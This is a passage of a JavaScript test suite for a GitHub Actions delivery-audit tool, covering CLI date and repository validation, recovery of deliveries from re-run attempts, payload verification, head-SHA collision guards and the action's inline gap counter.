    '/repos/praetorian-inc/guard/actions/runs/801/attempts/1/jobs?per_page=100': jobsWithStep('skipped'),
  });
  const heads = new Map([[5, [sib(800, 'failure'), sib(801, 'failure', 2)]]]);

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes, heads).then(() => {
    assert.deepEqual(classes.payload_missing, []);
    assert.deepEqual(classes.unverifiable, []);
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
  });
});

test('recoverHiddenDeliveries: with no head map the behaviour is unchanged', () => {
  const rec = failedRec();
  const classes = failedClasses(rec);
  const client = attemptClient(CURRENT(800, jobsDiedEarly()));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
    assert.deepEqual(client.asked, [
      '/repos/praetorian-inc/guard/actions/runs/800/jobs?per_page=100',
    ]);
  });
});

test('needsPayloadProbe: a SIBLING rescue is excluded too, or verifyPayloads undoes it', () => {
  // The two probe paths run in sequence over the same records: whatever
  // recoverHiddenDeliveries moves into `delivered` is then eligible for
  // verifyPayloads. Without `sent_by_run_id` in this predicate, verifyPayloads
  // re-reads the rescued row's OWN failed run, finds no send, and demotes the
  // delivery that had just been proved — through payload_missing, whose repair
  // instruction is a map edit and a replay.
  assert.equal(needsPayloadProbe({ number: 5, sent_by_run_id: 801 }), false);
  assert.equal(needsPayloadProbe({ number: 5, sent_by_run_id: 801, sent_by_run_attempt: 2 }), false);
  assert.equal(needsPayloadProbe({ number: 5 }), true);
});

// ── --until ──────────────────────────────────────────────────────────────────

test('parseArgs: --until is validated by the same three families as --since', () => {
  assert.throws(() => parseArgs(['--since=2026-01-01', '--until=07-2026'], NOW), /--until must be YYYY-MM-DD/);
  assert.throws(() => parseArgs(['--since=2026-01-01', '--until=2026-13-01'], NOW), /--until is not a real date/);
  // Roll-over: the family that does NOT produce NaN. 2026-02-31 becomes 2026-03-03.
  assert.throws(
    () => parseArgs(['--since=2026-01-01', '--until=2026-02-31'], NOW),
    /normalizes to 2026-03-03/,
  );
});

test('parseArgs: --until at or below --since is refused as an empty window', () => {
  assert.throws(
    () => parseArgs(['--since=2026-07-05', '--until=2026-07-05'], NOW),
    /is not after --since/,
  );
  assert.throws(
    () => parseArgs(['--since=2026-07-05', '--until=2026-07-04'], NOW),
    /examined nothing/,
  );
});

test('parseArgs: a valid --until is kept, and a FUTURE one is allowed', () => {
  assert.equal(parseArgs(['--since=2026-07-05', '--until=2026-07-10'], NOW).until, '2026-07-10');
  // "Up to now" is the default anyway, so a future upper bound is not the
  // vacuous-clean shape the future --since check refuses.
  assert.equal(parseArgs(['--since=2026-07-05', '--until=2030-01-01'], NOW).until, '2030-01-01');
  // Absent by default, so every existing caller keeps the open-ended window.
  assert.equal(parseArgs(['--since=2026-07-05'], NOW).until, null);
});

test('renderMarkdown: the header states the upper bound it actually used', () => {
  const base = {
    since: '2026-07-05',
    totals: { merged_prs: 1, delivered: 1 },
    repos_with_gaps: [],
    repos: [],
  };
  assert.match(renderMarkdown({ ...base, until: null }, CFG), /Window `2026-07-05` → now\./);
  assert.match(
    renderMarkdown({ ...base, until: '2026-07-20' }, CFG),
    /Window `2026-07-05` → `2026-07-20` \(exclusive\)\./,
  );
});

// ── the composite action's gap counter ───────────────────────────────────────
//
// This is CI glue, not exported surface, and until now nothing exercised it: the
// only way to learn it was broken was for a real gap to be reported to the fleet
// with the wrong number attached. It is pinned here because a Gemini review of
// this PR flagged `process.argv[1]` as a Critical bug and asked for `argv[2]`,
// which is correct for a `node script.js` invocation and WRONG for `node -e`
// (there is no script path in argv, so the first operand lands at index 1).
// Demonstrated at the time: argv[1] prints 5 and exits 0, argv[2] throws
// ERR_INVALID_ARG_TYPE. The tests below extract the real inline script out of
// action.yml and run it, so the next reviewer who "fixes" the index gets a red
// suite instead of an action that fails on every gap it finds.

import { readFileSync, mkdtempSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { execFileSync } from 'node:child_process';

const HERE = dirname(fileURLToPath(import.meta.url));
const SCRIPT = readFileSync(join(HERE, 'audit-delivery.mjs'), 'utf8');

// Extracted rather than duplicated. A copy of the script would keep passing
// after action.yml drifted away from it — the failure mode this whole block
// exists to catch.
const GAP_COUNTER = (() => {
  const yml = readFileSync(join(HERE, 'action.yml'), 'utf8');
  const m = yml.match(/gap_count=\$\(node -e '\n([\s\S]*?)\n\s*' "\$json"\)/);
  if (!m) {
    throw new Error(
      'could not extract the gap counter from action.yml — if the step was ' +
        'reformatted, update this matcher; do NOT delete the tests, or the ' +
        'counter goes unexercised again',
    );
  }
  return m[1];
})();

const runGapCounter = (report) => {
  const dir = mkdtempSync(join(tmpdir(), 'audit-gap-'));
  const p = join(dir, 'report.json');
  writeFileSync(p, JSON.stringify(report));
  return execFileSync(process.execPath, ['-e', GAP_COUNTER, p], { encoding: 'utf8' });
};

test('action.yml gap counter: the report path arrives at process.argv[1] under node -e', () => {
  // The literal is derived by hand: 2 replay + 1 payload_missing, plus 1 replay
  // and 0 payload_missing = 4. Chosen so that counting replay alone (3) or
  // payload_missing alone (1) both give a different answer.
  const out = runGapCounter({
    repos_with_gaps: [
      { repo: 'guard', replay: [1, 2], payload_missing: 1 },
      { repo: 'palatine', replay: [3], payload_missing: 0 },
    ],
  });
  assert.equal(out, '4');
});

test('action.yml gap counter: payload_missing is counted even with an EMPTY replay list', () => {
  // The specific under-count the reducer was written for: those PRs' authors are
  // missing their score, but replaying an unmapped author re-delivers nothing, so
  // they are deliberately off the replay list. replay.length alone would print 0
  // for a repo that has a real, live gap.
  assert.equal(runGapCounter({ repos_with_gaps: [{ repo: 'guard', replay: [], payload_missing: 3 }] }), '3');
});

test('action.yml gap counter: a missing payload_missing key does not poison the sum', () => {
  // `a + undefined` is NaN, which String()s to "NaN" and would flow into
  // $GITHUB_OUTPUT as a gap count. The `|| 0` is what prevents that; this fails
  // if it is removed.
  assert.equal(runGapCounter({ repos_with_gaps: [{ repo: 'guard', replay: [7, 8] }] }), '2');
});

test('action.yml gap counter: it FAILS rather than printing a reassuring 0', () => {
  // Reached only on the audit's exit 1, so some gap class was non-empty. A zero
  // here means this reducer cannot see the class that fired — an accounting bug
  // that must not render as "clean".
  assert.throws(
    () => runGapCounter({ repos_with_gaps: [{ repo: 'guard', replay: [], payload_missing: 0 }] }),
    /gaps reported but counted 0 affected PRs/,
  );
  // Same for a report it cannot parse at all.
  assert.throws(() => {
    const dir = mkdtempSync(join(tmpdir(), 'audit-gap-'));
    const p = join(dir, 'report.json');
    writeFileSync(p, 'not json');
    execFileSync(process.execPath, ['-e', GAP_COUNTER, p], { encoding: 'utf8', stdio: 'pipe' });
  });
});

test('action.yml gap counter: argv[2] is the WRONG index, demonstrated not asserted', () => {
  // The control for the pin above. Without this, a reader has only my word that
  // argv[2] is broken; with it, the suite itself shows the alternative failing.
  const wrong = GAP_COUNTER.replace('process.argv[1]', 'process.argv[2]');
  assert.notEqual(wrong, GAP_COUNTER);
  assert.throws(
    () => {
      const dir = mkdtempSync(join(tmpdir(), 'audit-gap-'));
      const p = join(dir, 'report.json');
      writeFileSync(p, JSON.stringify({ repos_with_gaps: [{ replay: [1], payload_missing: 0 }] }));
      execFileSync(process.execPath, ['-e', wrong, p], { encoding: 'utf8', stdio: 'pipe' });
    },
    (e) => /ERR_INVALID_ARG_TYPE|must be of type string/.test(String(e.stderr || e.message)),
  );
});

test('action.yml: every declared input is actually wired through to the script', () => {
  // The class-level pin for the defect this round found twice. --until was added
  // to the CLI to make the caller-renamed remediation expressible, but the
  // composite action is the only path CI has, and an input that is declared and
  // then never referenced is indistinguishable from one that works: the action
  // accepts it, ignores it, and audits the wrong window. Asserting the WIRING
  // rather than the presence of one flag means the next input added has to be
  // wired too.
  const yml = readFileSync(join(HERE, 'action.yml'), 'utf8');

  const declared = [
    ...yml
      .slice(yml.indexOf('\ninputs:'), yml.indexOf('\noutputs:'))
      .matchAll(/^ {2}([a-z][a-z0-9-]*):$/gm),
  ].map((m) => m[1]);
  // Guard against the extraction going vacuous if the file is restructured.
  assert.ok(declared.length >= 7, `expected the input block to parse, got ${declared.join(',')}`);
  assert.ok(declared.includes('until'), 'until must be a declared input');

  const body = yml.slice(yml.indexOf('\noutputs:'));
  for (const name of declared) {
    // Reached the step's env block...
    const env = new RegExp(`^\\s+([A-Z_]+): \\$\\{\\{ inputs\\.${name} \\}\\}$`, 'm').exec(body);
    assert.ok(env, `input "${name}" is declared but never mapped into the step env`);
    // ...and something actually CONSUMES that variable. A mapping alone is not
    // wiring: DAYS/SINCE prove the value has to be read to matter. There are two
    // legitimate consumers, and the pin has to accept both or it reports a
    // false positive on the token: the run body may read `$VAR` to build argv,
    // or the script may read process.env.VAR directly out of the inherited
    // environment — which is how GITHUB_TOKEN reaches it, deliberately, since
    // putting a credential in argv would expose it in the process table.
    const readInShell = new RegExp(`\\$${env[1]}\\b|\\$\\{${env[1]}\\b`).test(
      body.slice(body.indexOf('run: |')),
    );
    const readInScript = new RegExp(`process\\.env\\.${env[1]}\\b`).test(SCRIPT);
    assert.ok(
      readInShell || readInScript,
      `env var ${env[1]} (input "${name}") is set but read by neither the run body nor the script`,
    );
  }
});

test('action.yml: --until is appended outside the since/days branch', () => {
  // If it were nested in the --since arm, a caller using `days` would have its
  // upper bound silently dropped — and the script resolves days into a concrete
  // since before validating --until, so there is no reason to nest it.
  const yml = readFileSync(join(HERE, 'action.yml'), 'utf8');
  const args = yml.slice(yml.indexOf('args=('), yml.indexOf('rc=0'));
  const sinceArm = args.indexOf('args+=("--days=$DAYS")');
  const fiClosing = args.indexOf('fi', sinceArm);
  assert.ok(sinceArm > 0 && fiClosing > sinceArm, 'could not locate the since/days branch');
  assert.ok(
    args.indexOf('--until=$UNTIL') > fiClosing,
    '--until must be appended after the since/days branch closes',
  );
});

// ── round 8: the empty --repos hole, and the attempt walk that stopped early ──

test('parseArgs: an EMPTY --repos is rejected, not silently promoted to an org-wide audit', () => {
  // The plural half of the round-4 empty-`--repo` fix, which was left open: the
  // cited instance got fixed, the class did not. `--repos=` left out.repos as '',
  // the split below it was skipped for being falsy, and resolveFleet's
  // `if (!names)` is true for '' — so `--repos="$REPOS"` with REPOS unset audited
  // the WHOLE ORG. The control for this assertion is two lines down: resolveFleet
  // still org-enumerates for '', so this guard is the only thing standing between
  // a caller bug and the wrong subject.
  assert.throws(() => parseArgs(['--repos='], NOW), /--repos was passed with an empty value/);
  assert.throws(() => parseArgs(['--repos', ''], NOW), /--repos was passed with an empty value/);
  // And it fires even alongside --repo, where the mutual-exclusion check could not
  // see it: `if (out.repos)` is false for '', so that check was skipped too.
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--repos='], NOW),
    /--repos was passed with an empty value/,
  );
});

test('resolveFleet DOES org-enumerate for an empty repos string — the behaviour parseArgs now prevents', () => {
  // Not a test of resolveFleet's correctness: a demonstration that the parseArgs
  // guard above is load-bearing rather than defensive. If someone deletes it,
  // this test still documents what the deletion costs. `''` is falsy, so the
  // named-subject branch is skipped entirely and discovery runs.
  const asked = [];
  const client = {
    gh: async (p) => {
      asked.push(p);
      return { __missing: true };
    },
    ghPaged: async (p) => {
      asked.push(p);
      return [{ name: 'a', archived: false, disabled: false }];
    },
  };
  return resolveFleet(client, { owner: 'praetorian-inc', repos: '', callerPath: 'x.yml' }).then(
    () => {
      assert.ok(
        asked.some((p) => p.startsWith('/orgs/praetorian-inc/repos')),
        `expected an org enumeration, got ${JSON.stringify(asked)}`,
      );
    },
  );
});

test('parseArgs: a --repos of only separators blames the caller, not the org', () => {
  // `--repos=,,` survives the '' check and reaches resolveFleet as [], which is
  // TRUTHY — so it does not org-enumerate, it resolves an empty fleet and
  // main()'s zero-fleet guard exits 2. Safe, but that guard's message blames the
  // fleet probe or the token for what is a caller's own flag value: the
  // wrong-cause class from round 4, one layer up.
  for (const bad of ['--repos=,,', '--repos=,', '--repos= , ']) {
    assert.throws(
      () => parseArgs([bad], NOW),
      /--repos contained no repository names/,
      `expected ${bad} to be rejected`,
    );
  }
  // The message quotes what was actually passed, so the operator can see the
  // difference between their variable and their intent.
  assert.throws(() => parseArgs(['--repos=,,'], NOW), /got ",,"/);
  // A real list still parses — the guard is about emptiness, not about commas.
  assert.deepEqual(parseArgs(['--repos=guard, palatine ,'], NOW).repos, ['guard', 'palatine']);
});

test('recoverHiddenDeliveries: the attempt walk does NOT stop at a success that sent nothing', () => {
  // Attempt 2 succeeded without sending; attempt 1 succeeded AND sent. The
  // consumer already has this PR's message. Before the fix the descending walk
  // stopped at the first successful attempt and read its verdict as final, so
  // this record went to `payload_missing` — a FALSE gap whose remediation is a
  // prod replay of a message already in the queue.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 3 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.payload_missing, [], 'a sent attempt must not be a payload gap');
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    // Stamped with the attempt that SENT, not the latest one that succeeded.
    assert.equal(classes.delivered[0].recovered_attempt, 1);
    assert.deepEqual(classes.failed, []);
    // And off the replay list, which is the consequence that writes.
    assert.equal(
      replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5),
      false,
    );
  });
});

test('recoverHiddenDeliveries: payload_missing only after EVERY successful attempt was probed', () => {
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 3 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('skipped'),
  });

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.delivered, []);
    assert.deepEqual(classes.payload_missing.map((r) => r.number), [5]);
    assert.equal(classes.payload_missing[0].payload, 'missing');
    // Stamped with the LATEST success, because that is the attempt an operator
    // will open to see the missing send.
    assert.equal(classes.payload_missing[0].recovered_attempt, 2);
    // Both attempts' job lists were actually read — this is what distinguishes
    // the fix from the old early return, which produced the same verdict here.
    for (const n of [1, 2]) {
      assert.ok(
        client.asked.includes(
          `/repos/praetorian-inc/guard/actions/runs/900/attempts/${n}/jobs?per_page=100`,
        ),
        `attempt ${n} jobs were never probed; asked=${JSON.stringify(client.asked)}`,
      );
    }
  });
});

test('recoverHiddenDeliveries: the walk stops as soon as an attempt DID send', () => {
  // The exhaustive walk must not become an unconditional one: once a send is
  // found the verdict cannot change, so no further attempt is worth an API call.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 3 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100': jobsWithStep('success'),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.equal(classes.delivered[0].recovered_attempt, 2);
    assert.equal(
      client.asked.some((p) => p.includes('/attempts/1')),
      false,
      `attempt 1 must not be probed once attempt 2 sent; asked=${JSON.stringify(client.asked)}`,
    );
  });
});

test('verifyPayloads: a prior ATTEMPT that sent rescues a SUCCESS row from payload_missing', () => {
  // recoverHiddenDeliveries walks attempts only for failed/skipped rows. A run
  // re-run to SUCCESS whose re-run did not send never enters it and arrives here
  // instead, where only siblings were checked — so attempt 1's real send was
  // invisible and the PR was demoted to payload_missing.
  const recs = [{ number: 5, run_id: 700, run_attempt: 2 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'sent');
    assert.equal(recs[0].sent_by_attempt, 1);
  });
});

test('verifyPayloads: attempts are only probed when the winner did not send', () => {
  const recs = [{ number: 5, run_id: 700, run_attempt: 2 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('success'),
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'sent');
    assert.deepEqual(client.asked, [
      '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100',
    ]);
  });
});

test('verifyPayloads: an unreadable attempt yields unverifiable, not a payload gap', () => {
  // `not_sent` here becomes payload_missing, which asserts this PR delivered
  // nothing and sends an operator to edit ENGINEER_EMAIL_MAP and re-run — and
  // the re-run writes to the prod queue. An unreadable attempt is a place the
  // send could be hiding, so that assertion is not established. It does not
  // invent a send either: `unverifiable` is the class for "the API cannot
  // decide", and replayList excludes it.
  const recs = [{ number: 5, run_id: 700, run_attempt: 2 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    // attempts/1 is absent from the map, so attemptClient answers __missing.
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'unverifiable');
    assert.equal('sent_by_attempt' in recs[0], false);
    assert.equal(recs[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
  });
});

test('verifyPayloads: one unreadable attempt is enough, even beside a readable not_sent', () => {
  // Ordering pin, and the direction is deliberate: the question is "did this
  // head send AT ALL", so a readable attempt that provably did not send narrows
  // nothing — the unreadable one is still a place the send could be. Only a
  // clean sweep of READ evidence earns a definite verdict. Attempt 2 here is
  // readable and did not send; attempt 1 is gone.
  const recs = [{ number: 5, run_id: 700, run_attempt: 3 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/2': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/2/jobs?per_page=100': jobsWithStep('skipped'),
    // attempts/1 unreadable
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'unverifiable');
  });
});

test('verifyPayloads: a NON-SUCCESS earlier attempt that sent rescues the row', () => {
  // Same round-9 class as in recoverHiddenDeliveries, on the other entry point.
  // A row here concluded success, so its earlier attempts are the re-run ones —
  // `failure` and `cancelled` are the NORMAL conclusions for them, which is
  // precisely the population the conclusion gate used to skip.
  const recs = [{ number: 5, run_id: 700, run_attempt: 2 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1': { conclusion: 'failure' },
    '/repos/praetorian-inc/guard/actions/runs/700/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'sent');
    assert.equal(recs[0].sent_by_attempt, 1);
  });
});

test('verifyPayloads: the rename detector stays ARMED on the row, and off its attempts', () => {
  // `requireStep` tracks the conclusion of the thing being probed, never the
  // call site. On a SUCCESS row the step must exist — its absence is the caller
  // rename this detector exists to catch — so this must throw. Hardcoding
  // requireStep:false to make the attempt walk safe would have disarmed it for
  // the ~1054-row population it watches.
  const recs = [{ number: 5, run_id: 700, run_attempt: 1 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsDiedEarly(),
  });
  return assert.rejects(
    () => verifyPayloads(client, ACFG, 'guard', recs, null),
    new RegExp(`no step named "${SQS_STEP}"`),
  );
});

test('verifyPayloads: an unreadable OWN jobs list is UNDECIDED, and specifically not not_sent', () => {
  // There used to be a fatal/non-fatal split, per-ROW: the own run's jobs were
  // the evidence the audit decides FROM, so an unreadable one threw, while
  // auxiliary evidence (siblings, older attempts) degraded to unknown. The
  // premise was right — answering `not_sent` for a list nobody read is the
  // false-clean this detector exists to prevent — but `unverifiable` refuses that
  // answer just as completely, without costing every OTHER repo in the fleet its
  // report. So the split is gone and both paths land here.
  //
  // Asserted as `unverifiable` AND as not-`not_sent`, because those are different
  // claims: the first pins today's class, the second pins the property that must
  // hold however the classes are reshuffled — an unread run never becomes a
  // replay instruction.
  const recs = [{ number: 5, run_id: 700, run_attempt: 1 }];
  const client = attemptClient({});
  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'unverifiable');
    assert.notEqual(v.get(700), 'not_sent');
    assert.equal(recs[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
  });
});

test('verifyPayloads: a run on attempt 1 triggers no attempt probe at all', () => {
  // The control for the loop bound: `(run_attempt || 1) - 1` is 0, so the walk
  // body never executes and no /attempts/ path is ever built.
  const recs = [{ number: 5, run_id: 700, run_attempt: 1 }];
  const client = attemptClient({
    '/repos/praetorian-inc/guard/actions/runs/700/jobs?per_page=100': jobsWithStep('skipped'),
  });

  return verifyPayloads(client, ACFG, 'guard', recs, null).then((v) => {
    assert.equal(v.get(700), 'not_sent');
    assert.equal(
      client.asked.some((p) => p.includes('/attempts/')),
      false,
    );
  });
});

test('renderMarkdown: the replay list warns that an earlier repair is invisible to this report', () => {
  const md = renderMarkdown(gapReport({ replay: [9, 10] }), CFG);

  assert.match(md, /This report cannot see previous repairs/);
  assert.match(md, /a PR already repaired there still appears above/);
  assert.match(md, /writes a second copy/);

  // The operator still has to know WHICH workflow's run history to check, and the
  // dispatch command a few lines above names it — which is why the caveat itself
  // no longer interpolates `cfg.backfillCaller`. That text is now shared with
  // buildReport's JSON (see the REPLAY_CAVEATS test), and buildReport's cfg need
  // not carry the field at all, so interpolating it would render the literal
  // "undefined" into one channel or the other. Belt and braces on the direction
  // that actually harms an operator: no `undefined` anywhere in the document.
  assert.match(md, /gh workflow run leaderboard-backfill-caller\.yml --repo praetorian-inc\/guard/);
  assert.doesNotMatch(md, /undefined/);
});

test('renderMarkdown: a clean repo gets no repair warning, because it gets no replay list', () => {
  const clean = {
    mode: 'fleet',
    generated_at: '2026-08-04T12:00:00Z',
    window: { since: '2026-07-05', until: '2026-08-04' },
    api_calls: 10,
    totals: {
      merged_prs: 3,
      delivered: 3,
      failed: 0,
      never_fired: 0,
      skipped_anomaly: 0,
      payload_missing: 0,
      pre_onboarding: 0,
      in_flight: 0,
      unverifiable: 0,
    },
    repos: [],
    repos_with_gaps: [],
  };
  const md = renderMarkdown(clean, CFG);
  assert.doesNotMatch(md, /This report cannot see previous repairs/);
});

// ── round 8: the collision the WINDOW hid ────────────────────────────────────
//
// The head-SHA collision guard counted SHAs within the audited window only, while
// runsInRange deliberately over-fetches past --until. So a merged PR excluded by
// the window, sharing a head SHA with an included one, had its run credited to the
// included PR — and the guard saw a count of one and allowed it. Silent direction:
// the excluded PR's success speaks for the included PR's absent delivery.

test('classify: a head-SHA collision whose other half is OUTSIDE the window still refuses', () => {
  const prs = [pr(10, '2026-06-01T00:00:00Z', 'straddlesha')];
  // Merged after --until, so never classified — but its run is on the shared SHA.
  const outside = [pr(11, '2026-07-20T00:00:00Z', 'straddlesha')];
  const byHead = dedupeByHead([run(5, 'straddlesha', 'success', '2026-07-20T00:00:10Z')]);
  assert.throws(
    () => classify(prs, byHead, null, NOW, outside),
    /share head_sha straddle/,
  );
  // Both numbers named, and which side of the boundary each is on — an operator
  // told only "#10 has a collision" cannot find the collider, since it is not in
  // the report at all.
  assert.throws(() => classify(prs, byHead, null, NOW, outside), /#10 \(in window\)/);
  assert.throws(() => classify(prs, byHead, null, NOW, outside), /#11 .*OUTSIDE the audited/);
  // The remediation differs from the in-window case and must not be copied from
  // it: narrowing the window is what excluded the collider in the first place.
  assert.throws(
    () => classify(prs, byHead, null, NOW, outside),
    /Narrowing the window cannot fix this/,
  );
});

test('classify: the SAME input without the outside-window list is credited delivered', () => {
  // The control that makes the test above load-bearing rather than decorative:
  // this is the pre-fix behaviour, reachable today by omitting the argument. If the
  // guard were counting something it already had, this would throw too.
  const prs = [pr(10, '2026-06-01T00:00:00Z', 'straddlesha')];
  const byHead = dedupeByHead([run(5, 'straddlesha', 'success', '2026-07-20T00:00:10Z')]);
  const out = classify(prs, byHead, null, NOW);
  assert.equal(out.delivered.length, 1);
  assert.equal(out.delivered[0].number, 10);
});

test('classify: an outside-window collision with NO run on the shared SHA is allowed', () => {
  // Same predicate as the in-window guard, and for the same reason: with no run to
  // credit, each PR is classified from its own merged_at and no verdict crosses
  // between them. This is guard's real Aug-2025 shape (both SHAs total_count 0),
  // and throwing here would break the wide historical audit ENG-5775 needs — the
  // exact regression the in-window version of this guard already caused once.
  const prs = [pr(10, '2026-06-01T00:00:00Z', 'straddlesha')];
  const outside = [pr(11, '2026-07-20T00:00:00Z', 'straddlesha')];
  const out = classify(prs, new Map(), null, NOW, outside);
  assert.equal(out.never_fired.length, 1);
});

test('classify: outside-window PRs on OTHER SHAs are ignored', () => {
  // Without this control the guard could throw whenever `outsideWindow` is
  // non-empty — which is almost every real --until audit — and every assertion
  // above would still pass.
  const prs = [pr(10, '2026-06-01T00:00:00Z', 'shaten')];
  const outside = [pr(11, '2026-07-20T00:00:00Z', 'shaeleven')];
  const byHead = dedupeByHead([
    run(5, 'shaten', 'success', '2026-06-01T00:00:10Z'),
    run(6, 'shaeleven', 'success', '2026-07-20T00:00:10Z'),
  ]);
  const out = classify(prs, byHead, null, NOW, outside);
  assert.equal(out.delivered.length, 1);
});

test('classify: an UNMERGED PR outside the window is not a collider', () => {
  // A closed-unmerged PR fired no delivery, so its head SHA cannot be credited to
  // anyone. auditRepo filters on merged_at before passing the list; this pins the
  // consequence rather than the filter, so moving the check does not lose it.
  const prs = [pr(10, '2026-06-01T00:00:00Z', 'straddlesha')];
  const byHead = dedupeByHead([run(5, 'straddlesha', 'success', '2026-06-01T00:00:10Z')]);
  const out = classify(prs, byHead, null, NOW, [pr(11, null, 'straddlesha')]);
  assert.equal(out.delivered.length, 1);
});

test('auditRepo: the --until boundary collision reaches the guard end-to-end', async () => {
  // The wiring, which no classify() test can reach: the guard is only as good as
  // auditRepo actually collecting the PRs its own window threw away. Pre-fix this
  // audit returned a clean `delivered: 1`.
  const shared = 'straddlesha0000';
  const calls = [];
  const client = {
    ghPaged: async (path) => {
      calls.push(path);
      if (path.includes('/pulls?'))
        return [
          // Merged 2026-07-20, excluded by --until 2026-07-01. Present in the
          // fetch set because the closed-PR walk is a FULL history walk ordered by
          // the immutable `created` key — see the note on that fetch. Order within
          // this stub is irrelevant to the guard; what matters is that both PRs are
          // there for it to compare.
          { ...pr(11, '2026-07-20T00:00:00Z', shared), updated_at: '2026-07-20T00:00:00Z' },
          { ...pr(10, '2026-06-01T00:00:00Z', shared), updated_at: '2026-06-01T00:00:00Z' },
        ];
      if (path.includes('/commits?')) return []; // no caller history -> onboardedAt null
      if (path.includes('/runs?')) return [run(5, shared, 'success', '2026-07-20T00:00:10Z')];
      throw new Error(`unexpected ghPaged ${path}`);
    },
    gh: async (path) => {
      calls.push(path);
      if (path.includes('per_page=1&created=')) return { total_count: 1 };
      throw new Error(`unexpected gh ${path}`);
    },
    // A stable count: nothing was reopened under this walk, which is the case
    // every other assertion here is about.
    ghCount: async () => 2,
  };
  await assert.rejects(
    () =>
      auditRepo(client, { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: '2026-07-01' }, 'guard'),
    /#10 \(in window\).*#11 .*OUTSIDE/s,
  );
  // And it refused BEFORE spending the payload probes — the throw is in classify,
  // which runs ahead of recoverHiddenDeliveries and verifyPayloads. A guard that
  // fired only after the probes would still be correct but would burn a wide
  // audit's API budget on a verdict it was about to discard.
  assert.equal(calls.filter((p) => p.includes('/jobs')).length, 0);
});

test('auditRepo: a sibling run that sent rescues a FAILED row end-to-end', async () => {
  // The wiring is the load-bearing half of the round-9 fix and a pure-function
  // test passes either way: `recoverHiddenDeliveries` cannot see a sibling unless
  // auditRepo builds the map from the FULL run list and hands it over. Pre-fix,
  // the map was built for successes only and passed to verifyPayloads alone, so
  // this PR reported `failed` — and `failed` is the replay list.
  const shared = 'sharedhead00000';
  const client = {
    ghPaged: async (path) => {
      if (path.includes('/pulls?'))
